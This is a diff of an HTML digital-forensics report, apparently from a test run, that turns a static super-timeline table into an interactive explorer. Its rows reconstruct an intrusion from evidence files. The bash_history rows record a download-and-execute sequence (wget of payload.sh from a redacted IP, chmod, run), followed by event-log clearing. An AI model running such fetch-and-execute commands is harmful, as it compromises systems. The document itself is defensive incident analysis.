-          <td><code>2024-03-10T14:30:00+00:00</code></td>
-          <td><span class="badge badge-pass">FILE_CREATE</span></td>
-          <td>[USER_001]</td>
-          <td><code>evidence/investigation_memo.docx</code></td>
-          <td>ooxml:core_properties</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.98</td>
-          <td>
-            OOXML dcterms:created metadata
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2024-03-10T20:50:00+00:00</code></td>
-          <td><span class="badge badge-pass">WEB_VISIT</span></td>
-          <td>UNKNOWN</td>
-          <td><code>https://github.com/malicious/repo</code></td>
-          <td>Browser:Chromium:evidence/History</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.97</td>
-          <td>
-            Chromium last_visit_time WebKit timestamp
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2024-03-10T21:00:00+00:00</code></td>
-          <td><span class="badge badge-pass">WEB_VISIT</span></td>
-          <td>UNKNOWN</td>
-          <td><code>https://pastebin.com/raw/d849fa</code></td>
-          <td>Browser:Chromium:evidence/History</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.97</td>
-          <td>
-            Chromium last_visit_time WebKit timestamp
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2024-03-11T01:50:00+00:00</code></td>
-          <td><span class="badge badge-warn">FILE_WRITE</span></td>
-          <td>[USER_002]</td>
-          <td><code>evidence/investigation_memo.docx</code></td>
-          <td>ooxml:core_properties</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.98</td>
-          <td>
-            OOXML dcterms:modified metadata
-            
-            <div style="color: #f85149; font-size: 0.8rem; margin-top: 0.2rem;">⚠️ Timestomp suspect: Modified time 2024-03-11T01:50:00+00:00 precedes creation time 2026-10-05T18:35:05.253579+00:00</div>
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2024-03-11T02:14:07+00:00</code></td>
-          <td><span class="badge badge-pass">AUTH_LOGIN</span></td>
-          <td>[USER_003]</td>
-          <td><code>N/A</code></td>
-          <td>EVTX:evidence/Security_Events.jsonl</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.99</td>
-          <td>
-            Windows Event Log JSON entry for Event ID 4624
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2024-03-11T02:14:07+00:00</code></td>
-          <td><span class="badge badge-pass">AUTH_LOGIN</span></td>
-          <td>UNKNOWN</td>
-          <td><code>sshd[4401]</code></td>
-          <td>Linux:sshd[4401]:evidence/auth.log</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.85</td>
-          <td>
-            Syslog entry for sshd[4401] (assumed year 2024)
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2024-03-11T02:15:00+00:00</code></td>
-          <td><span class="badge badge-warn">PROCESS_START</span></td>
-          <td>UNKNOWN</td>
-          <td><code>wget http://[IP_004]/payload.sh</code></td>
-          <td>Linux:bash_history:evidence/bash_history</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.95</td>
-          <td>
-            Bash history command execution with Unix timestamp
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2024-03-11T02:15:30+00:00</code></td>
-          <td><span class="badge badge-pass">FILE_ACCESS</span></td>
-          <td>UNKNOWN</td>
-          <td><code>sudo</code></td>
-          <td>Linux:sudo:evidence/auth.log</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.85</td>
-          <td>
-            Syslog entry for sudo (assumed year 2024)
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2024-03-11T02:16:00+00:00</code></td>
-          <td><span class="badge badge-warn">PROCESS_START</span></td>
-          <td>UNKNOWN</td>
-          <td><code>chmod +x payload.sh</code></td>
-          <td>Linux:bash_history:evidence/bash_history</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.95</td>
-          <td>
-            Bash history command execution with Unix timestamp
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2024-03-11T02:16:15+00:00</code></td>
-          <td><span class="badge badge-warn">PROCESS_START</span></td>
-          <td>[USER_003]</td>
-          <td><code>N/A</code></td>
-          <td>EVTX:evidence/Security_Events.jsonl</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.99</td>
-          <td>
-            Windows Event Log JSON entry for Event ID 4688
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2024-03-11T02:17:00+00:00</code></td>
-          <td><span class="badge badge-warn">PROCESS_START</span></td>
-          <td>UNKNOWN</td>
-          <td><code>./payload.sh</code></td>
-          <td>Linux:bash_history:evidence/bash_history</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.95</td>
-          <td>
-            Bash history command execution with Unix timestamp
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2024-03-11T02:17:30+00:00</code></td>
-          <td><span class="badge badge-pass">SERVICE_INSTALL</span></td>
-          <td>UNKNOWN</td>
-          <td><code>N/A</code></td>
-          <td>EVTX:evidence/Security_Events.jsonl</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.99</td>
-          <td>
-            Windows Event Log JSON entry for Event ID 7045
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2024-03-11T02:18:45+00:00</code></td>
-          <td><span class="badge badge-pass">FILE_ACCESS</span></td>
-          <td>UNKNOWN</td>
-          <td><code>sshd[4401]</code></td>
-          <td>Linux:sshd[4401]:evidence/auth.log</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.85</td>
-          <td>
-            Syslog entry for sshd[4401] (assumed year 2024)
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2024-03-11T02:20:00+00:00</code></td>
-          <td><span class="badge badge-danger">LOG_CLEARED</span></td>
-          <td>[USER_003]</td>
-          <td><code>N/A</code></td>
-          <td>EVTX:evidence/Security_Events.jsonl</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.99</td>
-          <td>
-            Windows Event Log JSON entry for Event ID 1102
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2026-10-05T18:35:04.988720+00:00</code></td>
-          <td><span class="badge badge-pass">FILE_WRITE</span></td>
-          <td>UNKNOWN</td>
-          <td><code>evidence/auth.log</code></td>
-          <td>filesystem:stat</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.95</td>
-          <td>
-            Filesystem stat modification time (mtime)
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2026-10-05T18:35:04.995220+00:00</code></td>
-          <td><span class="badge badge-pass">FILE_WRITE</span></td>
-          <td>UNKNOWN</td>
-          <td><code>evidence/bash_history</code></td>
-          <td>filesystem:stat</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.95</td>
-          <td>
-            Filesystem stat modification time (mtime)
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2026-10-05T18:35:05.001724+00:00</code></td>
-          <td><span class="badge badge-pass">FILE_WRITE</span></td>
-          <td>UNKNOWN</td>
-          <td><code>evidence/Security_Events.jsonl</code></td>
-          <td>filesystem:stat</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.95</td>
-          <td>
-            Filesystem stat modification time (mtime)
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2026-10-05T18:35:05.027225+00:00</code></td>
-          <td><span class="badge badge-pass">FILE_WRITE</span></td>
-          <td>UNKNOWN</td>
-          <td><code>evidence/History</code></td>
-          <td>filesystem:stat</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.95</td>
-          <td>
-            Filesystem stat modification time (mtime)
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2026-10-05T18:35:05.043720+00:00</code></td>
-          <td><span class="badge badge-pass">FILE_WRITE</span></td>
-          <td>UNKNOWN</td>
-          <td><code>evidence/investigation_memo.docx</code></td>
-          <td>filesystem:stat</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.95</td>
-          <td>
-            Filesystem stat modification time (mtime)
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2026-10-05T18:35:05.057720+00:00</code></td>
-          <td><span class="badge badge-pass">FILE_WRITE</span></td>
-          <td>UNKNOWN</td>
-          <td><code>evidence/exfiltrated_files.zip</code></td>
-          <td>filesystem:stat</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.95</td>
-          <td>
-            Filesystem stat modification time (mtime)
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2026-10-05T18:35:05.107903+00:00</code></td>
-          <td><span class="badge badge-pass">FILE_CREATE</span></td>
-          <td>UNKNOWN</td>
-          <td><code>evidence/auth.log</code></td>
-          <td>filesystem:stat</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.9</td>
-          <td>
-            Filesystem stat creation/change time (ctime/birthtime)
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2026-10-05T18:35:05.141921+00:00</code></td>
-          <td><span class="badge badge-pass">FILE_CREATE</span></td>
-          <td>UNKNOWN</td>
-          <td><code>evidence/bash_history</code></td>
-          <td>filesystem:stat</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.9</td>
-          <td>
-            Filesystem stat creation/change time (ctime/birthtime)
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2026-10-05T18:35:05.174430+00:00</code></td>
-          <td><span class="badge badge-pass">FILE_CREATE</span></td>
-          <td>UNKNOWN</td>
-          <td><code>evidence/exfiltrated_files.zip</code></td>
-          <td>filesystem:stat</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.9</td>
-          <td>
-            Filesystem stat creation/change time (ctime/birthtime)
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2026-10-05T18:35:05.212036+00:00</code></td>
-          <td><span class="badge badge-pass">FILE_CREATE</span></td>
-          <td>UNKNOWN</td>
-          <td><code>evidence/History</code></td>
-          <td>filesystem:stat</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.9</td>
-          <td>
-            Filesystem stat creation/change time (ctime/birthtime)
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2026-10-05T18:35:05.253579+00:00</code></td>
-          <td><span class="badge badge-pass">FILE_CREATE</span></td>
-          <td>UNKNOWN</td>
-          <td><code>evidence/investigation_memo.docx</code></td>
-          <td>filesystem:stat</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.9</td>
-          <td>
-            Filesystem stat creation/change time (ctime/birthtime)
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2026-10-05T18:35:05.285087+00:00</code></td>
-          <td><span class="badge badge-pass">FILE_CREATE</span></td>
-          <td>UNKNOWN</td>
-          <td><code>evidence/Security_Events.jsonl</code></td>
-          <td>filesystem:stat</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.9</td>
-          <td>
-            Filesystem stat creation/change time (ctime/birthtime)
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2026-10-06T00:05:04+00:00</code></td>
-          <td><span class="badge badge-pass">FILE_WRITE</span></td>
-          <td>UNKNOWN</td>
-          <td><code>evidence/exfiltrated_files.zip::financial_report.pdf</code></td>
-          <td>zip:entry_central_dir</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.85</td>
-          <td>
-            ZIP entry central directory DOS timestamp
-            
-          </td>
-        </tr>
-        
-        <tr>
-          <td><code>2026-10-06T00:05:04+00:00</code></td>
-          <td><span class="badge badge-pass">FILE_WRITE</span></td>
-          <td>UNKNOWN</td>
-          <td><code>evidence/exfiltrated_files.zip::passwords.txt</code></td>
-          <td>zip:entry_central_dir</td>
-          <td>
-            
-            <span style="color: #8b949e;">-</span>
-            
-          </td>
-          <td>0.85</td>
-          <td>
-            ZIP entry central directory DOS timestamp
-            
-          </td>
-        </tr>
-        
-      </tbody>
-    </table>
+  <!-- 5. Reconstructed Super-Timeline with Interactive Visualizer -->
+  <section class="glass-panel">
+    <h2>5. Interactive Super-Timeline Explorer</h2>
+    <p style="color: var(--text-muted); margin-bottom: 1rem;">
+      Explore reconstructed forensic events chronologically. Scrub, search, or filter by source and alert tags in real-time.
+    </p>
+
+    <!-- Visual Activity Density Track -->
+    <div class="chart-container">
+      <div class="chart-title">
+        <span>ACTIVITY DENSITY &amp; BURST HEATMAP</span>
+        <span id="active-event-count">28 Events Loaded</span>
+      </div>
+      <div class="bars-track" id="bars-track">
+        <!-- Generated by JavaScript below -->
+      </div>
+    </div>
+
+    <!-- Live Filter Toolbar -->
+    <div class="timeline-toolbar">
+      <input type="text" id="timeline-search" class="search-input" placeholder="🔍 Live search timestamps, processes, file paths, users, rationale..." oninput="filterTimeline()">
+      <button class="filter-btn active" onclick="setFilter('ALL', this)">All</button>
+      <button class="filter-btn" onclick="setFilter('ALERT', this)">🚨 Alerts</button>
+      <button class="filter-btn" onclick="setFilter('CORROBORATED', this)">🔗 Corroborated</button>
+      <button class="filter-btn" onclick="setFilter('CONFLICT', this)">⚠️ Conflicts</button>
+      <button class="filter-btn" onclick="setFilter('FILE', this)">📁 Files</button>
+      <button class="filter-btn" onclick="setFilter('PROCESS', this)">⚙️ Processes</button>
+    </div>
+
+    <!-- Timeline Table -->
+    <div class="table-container">
+      <table id="timeline-table">
+        <thead>
+          <tr>
+            <th>UTC Timestamp</th>
+            <th>Action</th>
+            <th>User</th>
+            <th>Object / Target</th>
+            <th>Plugin</th>
+            <th>Corroborated By</th>
+            <th>Conf.</th>
+            <th>Rationale &amp; Warnings</th>
+          </tr>
+        </thead>
+        <tbody id="timeline-tbody">
+          
+          <tr data-action="FILE_CREATE" data-tags="" data-path="evidence/investigation_memo.docx" data-user="[USER_001]" data-plugin="ooxml:core_properties">
+            <td><code>2024-03-10T14:30:00+00:00</code></td>
+            <td>
+              <span class="badge badge-pass">
+                FILE_CREATE
+              </span>
+            </td>
+            <td>[USER_001]</td>
+            <td><code>evidence/investigation_memo.docx</code></td>
+            <td><span class="badge badge-pass">ooxml:core_properties</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.98</td>
+            <td>
+              OOXML dcterms:created metadata
+              
+            </td>
+          </tr>
+          
+          <tr data-action="WEB_VISIT" data-tags="web browser_history" data-path="https://github.com/malicious/repo" data-user="UNKNOWN" data-plugin="Browser:Chromium:evidence/History">
+            <td><code>2024-03-10T20:50:00+00:00</code></td>
+            <td>
+              <span class="badge badge-pass">
+                WEB_VISIT
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>https://github.com/malicious/repo</code></td>
+            <td><span class="badge badge-pass">Browser:Chromium:evidence/History</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.97</td>
+            <td>
+              Chromium last_visit_time WebKit timestamp
+              
+            </td>
+          </tr>
+          
+          <tr data-action="WEB_VISIT" data-tags="web browser_history" data-path="https://pastebin.com/raw/d849fa" data-user="UNKNOWN" data-plugin="Browser:Chromium:evidence/History">
+            <td><code>2024-03-10T21:00:00+00:00</code></td>
+            <td>
+              <span class="badge badge-pass">
+                WEB_VISIT
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>https://pastebin.com/raw/d849fa</code></td>
+            <td><span class="badge badge-pass">Browser:Chromium:evidence/History</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.97</td>
+            <td>
+              Chromium last_visit_time WebKit timestamp
+              
+            </td>
+          </tr>
+          
+          <tr data-action="FILE_WRITE" data-tags="CONFLICT TIMESTOMP_SUSPECT" data-path="evidence/investigation_memo.docx" data-user="[USER_002]" data-plugin="ooxml:core_properties">
+            <td><code>2024-03-11T01:50:00+00:00</code></td>
+            <td>
+              <span class="badge badge-warn">
+                FILE_WRITE
+              </span>
+            </td>
+            <td>[USER_002]</td>
+            <td><code>evidence/investigation_memo.docx</code></td>
+            <td><span class="badge badge-pass">ooxml:core_properties</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.98</td>
+            <td>
+              OOXML dcterms:modified metadata
+              
+              <div style="color: var(--neon-crimson); font-size: 0.8rem; margin-top: 0.25rem;">
+                ⚠️ Timestomp suspect: Modified time 2024-03-11T01:50:00+00:00 precedes creation time 2026-10-05T19:19:28.794882+00:00
+              </div>
+              
+            </td>
+          </tr>
+          
+          <tr data-action="AUTH_LOGIN" data-tags="logon" data-path="" data-user="[USER_003]" data-plugin="EVTX:evidence/Security_Events.jsonl">
+            <td><code>2024-03-11T02:14:07+00:00</code></td>
+            <td>
+              <span class="badge badge-pass">
+                AUTH_LOGIN
+              </span>
+            </td>
+            <td>[USER_003]</td>
+            <td><code>N/A</code></td>
+            <td><span class="badge badge-pass">EVTX:evidence/Security_Events.jsonl</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.99</td>
+            <td>
+              Windows Event Log JSON entry for Event ID 4624
+              
+            </td>
+          </tr>
+          
+          <tr data-action="AUTH_LOGIN" data-tags="auth" data-path="sshd[4401]" data-user="UNKNOWN" data-plugin="Linux:sshd[4401]:evidence/auth.log">
+            <td><code>2024-03-11T02:14:07+00:00</code></td>
+            <td>
+              <span class="badge badge-pass">
+                AUTH_LOGIN
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>sshd[4401]</code></td>
+            <td><span class="badge badge-pass">Linux:sshd[4401]:evidence/auth.log</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.85</td>
+            <td>
+              Syslog entry for sshd[4401] (assumed year 2024)
+              
+            </td>
+          </tr>
+          
+          <tr data-action="PROCESS_START" data-tags="execution bash" data-path="wget http://[IP_004]/payload.sh" data-user="UNKNOWN" data-plugin="Linux:bash_history:evidence/bash_history">
+            <td><code>2024-03-11T02:15:00+00:00</code></td>
+            <td>
+              <span class="badge badge-warn">
+                PROCESS_START
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>wget http://[IP_004]/payload.sh</code></td>
+            <td><span class="badge badge-pass">Linux:bash_history:evidence/bash_history</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.95</td>
+            <td>
+              Bash history command execution with Unix timestamp
+              
+            </td>
+          </tr>
+          
+          <tr data-action="FILE_ACCESS" data-tags="" data-path="sudo" data-user="UNKNOWN" data-plugin="Linux:sudo:evidence/auth.log">
+            <td><code>2024-03-11T02:15:30+00:00</code></td>
+            <td>
+              <span class="badge badge-pass">
+                FILE_ACCESS
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>sudo</code></td>
+            <td><span class="badge badge-pass">Linux:sudo:evidence/auth.log</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.85</td>
+            <td>
+              Syslog entry for sudo (assumed year 2024)
+              
+            </td>
+          </tr>
+          
+          <tr data-action="PROCESS_START" data-tags="execution bash" data-path="chmod +x payload.sh" data-user="UNKNOWN" data-plugin="Linux:bash_history:evidence/bash_history">
+            <td><code>2024-03-11T02:16:00+00:00</code></td>
+            <td>
+              <span class="badge badge-warn">
+                PROCESS_START
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>chmod +x payload.sh</code></td>
+            <td><span class="badge badge-pass">Linux:bash_history:evidence/bash_history</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.95</td>
+            <td>
+              Bash history command execution with Unix timestamp
+              
+            </td>
+          </tr>
+          
+          <tr data-action="PROCESS_START" data-tags="execution process_create" data-path="" data-user="[USER_003]" data-plugin="EVTX:evidence/Security_Events.jsonl">
+            <td><code>2024-03-11T02:16:15+00:00</code></td>
+            <td>
+              <span class="badge badge-warn">
+                PROCESS_START
+              </span>
+            </td>
+            <td>[USER_003]</td>
+            <td><code>N/A</code></td>
+            <td><span class="badge badge-pass">EVTX:evidence/Security_Events.jsonl</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.99</td>
+            <td>
+              Windows Event Log JSON entry for Event ID 4688
+              
+            </td>
+          </tr>
+          
+          <tr data-action="PROCESS_START" data-tags="execution bash" data-path="./payload.sh" data-user="UNKNOWN" data-plugin="Linux:bash_history:evidence/bash_history">
+            <td><code>2024-03-11T02:17:00+00:00</code></td>
+            <td>
+              <span class="badge badge-warn">
+                PROCESS_START
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>./payload.sh</code></td>
+            <td><span class="badge badge-pass">Linux:bash_history:evidence/bash_history</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.95</td>
+            <td>
+              Bash history command execution with Unix timestamp
+              
+            </td>
+          </tr>
+          
+          <tr data-action="SERVICE_INSTALL" data-tags="persistence service" data-path="" data-user="UNKNOWN" data-plugin="EVTX:evidence/Security_Events.jsonl">
+            <td><code>2024-03-11T02:17:30+00:00</code></td>
+            <td>
+              <span class="badge badge-pass">
+                SERVICE_INSTALL
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>N/A</code></td>
+            <td><span class="badge badge-pass">EVTX:evidence/Security_Events.jsonl</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.99</td>
+            <td>
+              Windows Event Log JSON entry for Event ID 7045
+              
+            </td>
+          </tr>
+          
+          <tr data-action="FILE_ACCESS" data-tags="auth" data-path="sshd[4401]" data-user="UNKNOWN" data-plugin="Linux:sshd[4401]:evidence/auth.log">
+            <td><code>2024-03-11T02:18:45+00:00</code></td>
+            <td>
+              <span class="badge badge-pass">
+                FILE_ACCESS
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>sshd[4401]</code></td>
+            <td><span class="badge badge-pass">Linux:sshd[4401]:evidence/auth.log</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.85</td>
+            <td>
+              Syslog entry for sshd[4401] (assumed year 2024)
+              
+            </td>
+          </tr>
+          
+          <tr data-action="LOG_CLEARED" data-tags="anti_forensics log_cleared" data-path="" data-user="[USER_003]" data-plugin="EVTX:evidence/Security_Events.jsonl">
+            <td><code>2024-03-11T02:20:00+00:00</code></td>
+            <td>
+              <span class="badge badge-danger">
+                LOG_CLEARED
+              </span>
+            </td>
+            <td>[USER_003]</td>
+            <td><code>N/A</code></td>
+            <td><span class="badge badge-pass">EVTX:evidence/Security_Events.jsonl</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.99</td>
+            <td>
+              Windows Event Log JSON entry for Event ID 1102
+              
+            </td>
+          </tr>
+          
+          <tr data-action="FILE_WRITE" data-tags="" data-path="evidence/auth.log" data-user="UNKNOWN" data-plugin="filesystem:stat">
+            <td><code>2026-10-05T19:19:25.001462+00:00</code></td>
+            <td>
+              <span class="badge badge-pass">
+                FILE_WRITE
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>evidence/auth.log</code></td>
+            <td><span class="badge badge-pass">filesystem:stat</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.95</td>
+            <td>
+              Filesystem stat modification time (mtime)
+              
+            </td>
+          </tr>
+          
+          <tr data-action="FILE_WRITE" data-tags="" data-path="evidence/bash_history" data-user="UNKNOWN" data-plugin="filesystem:stat">
+            <td><code>2026-10-05T19:19:25.006962+00:00</code></td>
+            <td>
+              <span class="badge badge-pass">
+                FILE_WRITE
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>evidence/bash_history</code></td>
+            <td><span class="badge badge-pass">filesystem:stat</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.95</td>
+            <td>
+              Filesystem stat modification time (mtime)
+              
+            </td>
+          </tr>
+          
+          <tr data-action="FILE_WRITE" data-tags="" data-path="evidence/Security_Events.jsonl" data-user="UNKNOWN" data-plugin="filesystem:stat">
+            <td><code>2026-10-05T19:19:25.012812+00:00</code></td>
+            <td>
+              <span class="badge badge-pass">
+                FILE_WRITE
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>evidence/Security_Events.jsonl</code></td>
+            <td><span class="badge badge-pass">filesystem:stat</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.95</td>
+            <td>
+              Filesystem stat modification time (mtime)
+              
+            </td>
+          </tr>
+          
+          <tr data-action="FILE_WRITE" data-tags="" data-path="evidence/History" data-user="UNKNOWN" data-plugin="filesystem:stat">
+            <td><code>2026-10-05T19:19:25.038807+00:00</code></td>
+            <td>
+              <span class="badge badge-pass">
+                FILE_WRITE
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>evidence/History</code></td>
+            <td><span class="badge badge-pass">filesystem:stat</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.95</td>
+            <td>
+              Filesystem stat modification time (mtime)
+              
+            </td>
+          </tr>
+          
+          <tr data-action="FILE_WRITE" data-tags="" data-path="evidence/investigation_memo.docx" data-user="UNKNOWN" data-plugin="filesystem:stat">
+            <td><code>2026-10-05T19:19:25.057383+00:00</code></td>
+            <td>
+              <span class="badge badge-pass">
+                FILE_WRITE
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>evidence/investigation_memo.docx</code></td>
+            <td><span class="badge badge-pass">filesystem:stat</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.95</td>
+            <td>
+              Filesystem stat modification time (mtime)
+              
+            </td>
+          </tr>
+          
+          <tr data-action="FILE_WRITE" data-tags="" data-path="evidence/exfiltrated_files.zip" data-user="UNKNOWN" data-plugin="filesystem:stat">
+            <td><code>2026-10-05T19:19:25.068376+00:00</code></td>
+            <td>
+              <span class="badge badge-pass">
+                FILE_WRITE
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>evidence/exfiltrated_files.zip</code></td>
+            <td><span class="badge badge-pass">filesystem:stat</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.95</td>
+            <td>
+              Filesystem stat modification time (mtime)
+              
+            </td>
+          </tr>
+          
+          <tr data-action="FILE_CREATE" data-tags="" data-path="evidence/auth.log" data-user="UNKNOWN" data-plugin="filesystem:stat">
+            <td><code>2026-10-05T19:19:25.202047+00:00</code></td>
+            <td>
+              <span class="badge badge-pass">
+                FILE_CREATE
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>evidence/auth.log</code></td>
+            <td><span class="badge badge-pass">filesystem:stat</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.9</td>
+            <td>
+              Filesystem stat creation/change time (ctime/birthtime)
+              
+            </td>
+          </tr>
+          
+          <tr data-action="FILE_CREATE" data-tags="" data-path="evidence/bash_history" data-user="UNKNOWN" data-plugin="filesystem:stat">
+            <td><code>2026-10-05T19:19:26.173855+00:00</code></td>
+            <td>
+              <span class="badge badge-pass">
+                FILE_CREATE
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>evidence/bash_history</code></td>
+            <td><span class="badge badge-pass">filesystem:stat</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.9</td>
+            <td>
+              Filesystem stat creation/change time (ctime/birthtime)
+              
+            </td>
+          </tr>
+          
+          <tr data-action="FILE_CREATE" data-tags="" data-path="evidence/exfiltrated_files.zip" data-user="UNKNOWN" data-plugin="filesystem:stat">
+            <td><code>2026-10-05T19:19:27.029291+00:00</code></td>
+            <td>
+              <span class="badge badge-pass">
+                FILE_CREATE
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>evidence/exfiltrated_files.zip</code></td>
+            <td><span class="badge badge-pass">filesystem:stat</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.9</td>
+            <td>
+              Filesystem stat creation/change time (ctime/birthtime)
+              
+            </td>
+          </tr>
+          
+          <tr data-action="FILE_CREATE" data-tags="" data-path="evidence/History" data-user="UNKNOWN" data-plugin="filesystem:stat">
+            <td><code>2026-10-05T19:19:27.931624+00:00</code></td>
+            <td>
+              <span class="badge badge-pass">
+                FILE_CREATE
+              </span>
+            </td>
+            <td>UNKNOWN</td>
+            <td><code>evidence/History</code></td>
+            <td><span class="badge badge-pass">filesystem:stat</span></td>
+            <td>
+              
+              <span style="color: var(--text-dim);">-</span>
+              
+            </td>
+            <td>0.9</td>
+            <td>
+              Filesystem stat creation/change time (ctime/birthtime)
+              
+            </td>
+          </tr>
+          
